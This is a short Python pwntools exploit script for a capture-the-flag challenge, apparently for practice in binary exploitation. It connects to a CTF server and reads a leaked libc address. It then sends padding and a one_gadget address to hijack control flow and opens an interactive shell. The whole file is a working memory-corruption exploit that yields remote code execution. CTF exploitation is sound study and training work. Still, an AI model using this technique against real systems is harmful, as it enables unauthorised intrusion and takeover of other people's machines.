#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
import time

pwn_file = "./libccc"
elf = ELF(pwn_file)
libc = ELF('./libc.so.6')
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'

dbg_script = """
vmmap
"""
# c = process(pwn_file, env={'LD_PRELOAD': './libc.so.6'})
# gdb.attach(c,dbg_script)
c = remote('ctf.adl.tw', '11004')
libc_base = u64(c.recvn(8)) - 0x3eba00 
print(hex(libc_base))
c.sendafter('Enter one string: ', b'a' * 0x40)

# one_gadget ./libc.so.6  
c.sendafter('Enter another: ', p64(libc_base + 0x10a38c))

c.interactive()
c.close()
